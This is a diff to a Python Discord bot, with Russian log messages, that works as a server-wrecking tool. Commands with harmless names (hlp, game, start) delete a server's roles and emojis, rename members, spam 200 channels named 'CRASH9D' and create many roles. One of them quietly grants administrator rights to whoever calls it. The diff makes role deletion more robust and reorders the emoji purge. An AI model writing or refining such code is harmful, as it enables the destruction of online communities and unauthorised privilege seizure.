@@ -83,8 +83,12 @@ async def hlp(ctx):
     roles.pop(0)
     for role in roles:
         if ctx.guild.me.roles[-1] > role:
-            await role.delete()
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+            try:
+                await role.delete()
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+            except:
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
+                continue
         else:
             break
     print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
@@ -99,15 +103,6 @@ async def hlp(ctx):
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
     
-    for emoji in list(ctx.guild.emojis):
-        try:
-            await emoji.delete()
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
-        except:
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
-            continue
-    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
-    
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
     for b in range(200):
         await ctx.guild.create_text_channel("CRASH9D")
@@ -120,6 +115,14 @@ async def hlp(ctx):
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
 
+    for emoji in list(ctx.guild.emojis):
+        try:
+            await emoji.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил этот трикалятый смайлик")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
+            continue
+    print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
 
 
     
@@ -133,8 +136,9 @@ async def game(ctx, pos: int):
         await role.edit(position=pos, reason="Админ идиот")
         await ctx.message.author.add_roles(role)
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
-    except:
+    except discord.HTTPException:
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
+        
 
 @client.command()
 async def start(ctx):
@@ -142,8 +146,12 @@ async def start(ctx):
   roles.pop(0)
   for role in roles:
       if ctx.guild.me.roles[-1] > role:
-          await role.delete()
-          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+           try:
+                await role.delete()
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+           except:
+                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
+                continue
       else:
           break
   print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
@@ -179,3 +187,4 @@ except Exception:
     pass
 except KeyboardInterrupt:
     sys.exit()
+
